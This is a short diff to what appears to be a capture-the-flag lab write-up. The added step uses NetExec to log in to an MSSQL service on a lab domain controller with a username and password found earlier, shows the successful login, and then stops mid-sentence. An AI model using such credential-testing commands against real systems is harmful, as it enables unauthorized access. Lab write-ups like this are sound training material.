@@ -362,5 +362,10 @@ SQLGuest:zDPBpaF4FywlqIv11vii
 Ill try these creds on this service
 
 ```python
-
+nxc mssql dc.redelegate.vl -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth
+MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (EncryptionReq:False)
+MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii
 ```
+I can access this service as this user 
+
+Looks like 
